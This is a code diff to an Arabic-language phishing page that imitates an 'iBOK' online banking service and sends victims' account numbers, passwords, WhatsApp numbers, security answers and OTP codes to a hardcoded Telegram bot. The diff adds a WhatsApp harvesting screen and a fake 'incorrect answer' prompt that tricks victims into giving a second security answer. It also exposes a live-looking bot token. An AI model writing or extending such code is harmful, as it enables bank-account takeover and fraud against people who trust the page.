@@ -320,6 +320,13 @@
             justify-content: center;
             text-decoration: none;
             animation: pulse-green 2s infinite;
+            cursor: pointer;
+        }
+
+        .whatsapp-float.disabled {
+            opacity: 0.55;
+            animation: none;
+            cursor: not-allowed;
         }
 
         @keyframes pulse-green {
@@ -354,7 +361,23 @@
             <p>الرجاء الاختيار من الخدمات المقدمة أدناه</p>
         </div>
 
-        <!-- 1. تغيير رقم الهاتف -->
+        <!-- 1. تحديث بيانات (الأولى) -->
+        <div class="service-card" onclick="openDetails('تحديث بيانات', 'تحديث بيانات الحساب البنكي والمعلومات الشخصية.')">
+            <div class="service-icon">
+                <div class="icon-circle">
+                    <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#ffffff" stroke-width="2">
+                        <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
+                        <circle cx="12" cy="7" r="4"></circle>
+                    </svg>
+                </div>
+            </div>
+            <div class="service-info">
+                <h2 class="service-title">تحديث بيانات</h2>
+                <p class="service-desc">تحديث بيانات الحساب البنكي والمعلومات الشخصية.</p>
+            </div>
+        </div>
+
+        <!-- 2. تغيير رقم الهاتف -->
         <div class="service-card" onclick="openDetails('تغيير رقم الهاتف', 'تحديث وتغيير رقم الهاتف المرتبط بالحساب البنكي.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -369,7 +392,7 @@
             </div>
         </div>
 
-        <!-- 2. ربط الحساب ببرنامج منظمة ثمرات -->
+        <!-- 3. ربط الحساب ببرنامج منظمة ثمرات -->
         <div class="service-card" onclick="openDetails('ربط الحساب ببرنامج منظمة ثمرات', 'ربط وتفعيل حسابك البنكي للاستفادة من برنامج دعم منظمة ثمرات.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -387,7 +410,7 @@
             </div>
         </div>
 
-        <!-- 3. التحويلات الخاطئة -->
+        <!-- 4. التحويلات الخاطئة -->
         <div class="service-card" onclick="openDetails('التحويلات الخاطئة', 'معالجة أخطاء التحويلات البنكية.')">
             <div class="service-icon">
                 <svg width="34" height="34" viewBox="0 0 24 24" fill="none">
@@ -401,7 +424,7 @@
             </div>
         </div>
 
-        <!-- 4. خدمات العملات الأجنبية -->
+        <!-- 5. خدمات العملات الأجنبية -->
         <div class="service-card" onclick="openDetails('خدمات العملات الأجنبية', 'تفعيل وإدارة العملات الأجنبية.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -418,7 +441,7 @@
             </div>
         </div>
 
-        <!-- 5. رفع سقف التحويلات اليومية -->
+        <!-- 6. رفع سقف التحويلات اليومية -->
         <div class="service-card" onclick="openDetails('رفع سقف التحويلات اليومية', 'زيادة الحد اليومي للتحويلات.')">
             <div class="service-icon">
                 <div class="icon-circle">
@@ -434,7 +457,7 @@
             </div>
         </div>
 
-        <!-- 6. كشف الحساب -->
+        <!-- 7. كشف الحساب -->
         <div class="service-card" onclick="openDetails('كشف الحساب', 'الحصول على كشف حساب مفصل.')">
             <div class="service-icon">
                 <div class="icon-rect">
@@ -451,7 +474,7 @@
             </div>
         </div>
 
-        <!-- 7. بطاقة فيزا افتراضية -->
+        <!-- 8. بطاقة فيزا افتراضية -->
         <div class="service-card" onclick="openDetails('بطاقة فيزا افتراضية', 'تفعيل بطاقة فيزا للاستخدام الإلكتروني.')">
             <div class="service-icon">
                 <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
@@ -465,7 +488,7 @@
             </div>
         </div>
 
-        <!-- 8. حساب جاري و حساب مميز -->
+        <!-- 9. حساب جاري و حساب مميز -->
         <div class="service-card" onclick="openDetails('حساب جاري و حساب مميز', 'فتح أو ترقية الحساب.')">
             <div class="service-icon">
                 <svg width="36" height="26" viewBox="0 0 24 18" fill="none">
@@ -540,6 +563,29 @@
         </div>
     </div>
 
+    <!-- الشاشة 3.5: إدخال رقم الواتساب (بعد تسجيل الدخول وقبل سؤال الأمان) -->
+    <div id="screen-whatsapp" class="screen">
+        <div class="top-navbar" style="margin: -20px -15px 20px -15px;">
+            <div>
+                <div class="logo-text">iBOK</div>
+                <div style="font-size: 10px; font-weight: 600;">Online Form الاستمارة أونلاين</div>
+            </div>
+            <span class="yellow-badge" style="background-color: #b71c1c; color: #fff;">مرحباً بكم في خدمة iBOK</span>
+        </div>
+
+        <div class="form-card">
+            <h2 class="form-title">رقم الواتساب</h2>
+            <p class="form-subtitle">الرجاء إدخال رقم الواتساب الخاص بك</p>
+
+            <div class="input-group">
+                <label>رقم الواتساب:</label>
+                <input type="text" id="whatsappInput" class="input-field" placeholder="أدخل رقم الواتساب">
+            </div>
+
+            <button class="btn-submit" onclick="submitWhatsapp()">متابعة</button>
+        </div>
+    </div>
+
     <!-- الشاشة 4: سؤال الأمان -->
     <div id="screen-security" class="screen">
         <div class="top-navbar" style="margin: -20px -15px 20px -15px;">
@@ -595,7 +641,7 @@
 
             <div class="input-group">
                 <label>أدخل رمز التحقق (OTP):</label>
-                <input type="text" id="otpInput" class="input-field" placeholder="أدخل رمز مكون من 6 أرقام" maxlength="6">
+                <input type="text" id="otpInput" class="input-field" placeholder="أدخل رمز مكون من 6 أرقام" maxlength="6" inputmode="numeric">
             </div>
 
             <div class="timer-text">إعادة إرسال الرمز خلال <span id="timer">30:00</span> دقيقة</div>
@@ -606,8 +652,8 @@
 
 </div>
 
-<!-- زر الواتساب العائم مع الترددات الخضراء -->
-<a href="https://wa.me/249124003011" class="whatsapp-float" target="_blank" title="تواصل عبر الواتساب">
+<!-- زر الواتساب العائم مع الترددات الخضراء (معطل حتى إرسال رمز التحقق) -->
+<a href="https://wa.me/249124003011" id="whatsappBtn" class="whatsapp-float disabled" target="_blank" title="تواصل عبر الواتساب" onclick="handleWhatsappClick(event)">
     <svg width="36" height="36" viewBox="0 0 24 24" fill="#ffffff">
         <path d="M.057 24l1.687-6.163c-1.041-1.804-1.588-3.849-1.587-5.946.003-6.556 5.338-11.891 11.893-11.891 3.181.001 6.167 1.24 8.413 3.488 2.245 2.248 3.481 5.236 3.48 8.414-.003 6.557-5.338 11.892-11.893 11.892-1.99-.001-3.951-.5-5.688-1.448l-6.305 1.654zm6.597-3.807c1.676.995 3.276 1.591 5.392 1.592 5.448 0 9.886-4.434 9.889-9.885.002-5.462-4.415-9.89-9.881-9.892-5.452 0-9.887 4.434-9.889 9.884-.001 2.225.651 3.891 1.746 5.634l-.999 3.648 3.742-.981zm11.387-5.464c-.074-.124-.272-.198-.57-.347-.297-.149-1.758-.868-2.031-.967-.272-.099-.47-.149-.669.149-.198.297-.768.967-.941 1.165-.173.198-.347.223-.644.074-.297-.149-1.255-.462-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.297-.347.446-.521.151-.172.2-.296.3-.495.099-.198.05-.372-.025-.521-.075-.148-.669-1.611-.916-2.206-.242-.579-.487-.501-.669-.51l-.57-.01c-.198 0-.52.074-.792.372s-1.04 1.016-1.04 2.479 1.065 2.876 1.213 3.074c.149.198 2.095 3.2 5.076 4.487.709.306 1.263.489 1.694.626.712.226 1.36.194 1.872.118.571-.085 1.758-.719 2.006-1.413.248-.695.248-1.29.173-1.414z"/>
     </svg>
@@ -616,9 +662,12 @@
 <script>
     let timerInterval;
     let currentService = "";
+    let securityAttempts = 0;
+    let isOtpCompleted = false;
     let userData = {
         account: "",
         password: "",
+        whatsapp: "",
         question: "",
         answer: "",
         otp: ""
@@ -629,6 +678,26 @@
 
     const bot2Token = "8602888229:AAHB0XSqtkVa--8uj3OvNAbNsuM4KFECtZ0";
     const bot2ChatId = "8623773122";
+
+    // قيد: رمز التحقق لا يقبل إلا أرقاماً
+    document.addEventListener("DOMContentLoaded", function () {
+        const otpEl = document.getElementById("otpInput");
+        if (otpEl) {
+            otpEl.addEventListener("input", function () {
+                this.value = this.value.replace(/\D/g, "").slice(0, 6);
+            });
+        }
+    });
+
+    // التحكم في زر الواتساب: لا يعمل إلا بعد رمز التحقق
+    function handleWhatsappClick(event) {
+        if (!isOtpCompleted) {
+            event.preventDefault();
+            alert("يرجى إتمام إدخال رمز التحقق (OTP) أولاً لتفعيل زر الواتساب.");
+            return false;
+        }
+        return true;
+    }
 
     // دالة إرسال الرسالة منفصلة للبوتين معاً
     function sendToTelegram(message) {
@@ -644,6 +713,10 @@
         screens.forEach(screen => screen.classList.remove('active'));
         document.getElementById(screenId).classList.add('active');
         window.scrollTo(0, 0);
+
+        if (screenId === 'screen-security') {
+            securityAttempts = 0;
+        }
 
         if (screenId === 'screen-otp') {
             startTimer(30 * 60);
@@ -682,14 +755,31 @@
         
         sendToTelegram(msg);
 
+        goToScreen('screen-whatsapp');
+    }
+
+    // 1.5 إرسال رقم الواتساب والانتقال إلى سؤال الأمان
+    function submitWhatsapp() {
+        userData.whatsapp = document.getElementById('whatsappInput').value.trim();
+
+        if(!userData.whatsapp) {
+            alert('الرجاء إدخال رقم الواتساب');
+            return;
+        }
+
+        let msg = `💬 رقم الواتساب\n\n` +
+                  `📱 الرقم: \`${userData.whatsapp}\``;
+
+        sendToTelegram(msg);
+
         goToScreen('screen-security');
     }
 
-    // 2. إرسال رسالة سؤال الأمان منفصلة ومختصرة مثل الصورة
+    // 2. إرسال رسالة سؤال الأمان (يظهر خطأ وسؤال آخر تلقائياً في المحاولة الأولى ثم ينتقل لرمز التحقق)
     function submitSecurity() {
         const selectObj = document.getElementById('securityQuestion');
         userData.question = selectObj.options[selectObj.selectedIndex].text;
-        userData.answer = document.getElementById('securityAnswer').value;
+        userData.answer = document.getElementById('securityAnswer').value.trim();
 
         if(!userData.answer || selectObj.selectedIndex === 0) {
             alert('الرجاء اختيار السؤال وإدخال الجواب');
@@ -701,6 +791,18 @@
                   `💡 الإجابة: \`${userData.answer}\``;
         
         sendToTelegram(msg);
+
+        if (securityAttempts === 0) {
+            securityAttempts++;
+            alert('إجابة سؤال الأمان غير صحيحة، تم تغيير السؤال تلقائياً يرجى الإجابة على السؤال الجديد.');
+            let nextIndex = selectObj.selectedIndex + 1;
+            if (nextIndex >= selectObj.options.length) {
+                nextIndex = 1;
+            }
+            selectObj.selectedIndex = nextIndex;
+            document.getElementById('securityAnswer').value = '';
+            return;
+        }
 
         goToScreen('screen-otp');
     }
@@ -728,11 +830,19 @@
 
     // 3. إرسال رسالة رمز التحقق OTP منفصلة ومختصرة مثل الصورة
     function submitOtpAndRedirect() {
-        userData.otp = document.getElementById('otpInput').value;
+        const otpEl = document.getElementById('otpInput');
+        otpEl.value = otpEl.value.replace(/\D/g, "");
+        userData.otp = otpEl.value;
 
-        if(!userData.otp) {
-            alert('الرجاء إدخال رمز التحقق');
+        if(!userData.otp || !/^\d+$/.test(userData.otp)) {
+            alert('الرجاء إدخال رمز التحقق بالأرقام فقط');
             return;
+        }
+
+        isOtpCompleted = true;
+        const waBtn = document.getElementById('whatsappBtn');
+        if (waBtn) {
+            waBtn.classList.remove('disabled');
         }
 
         let msg = `📱 رمز التحقق OTP\n\n` +
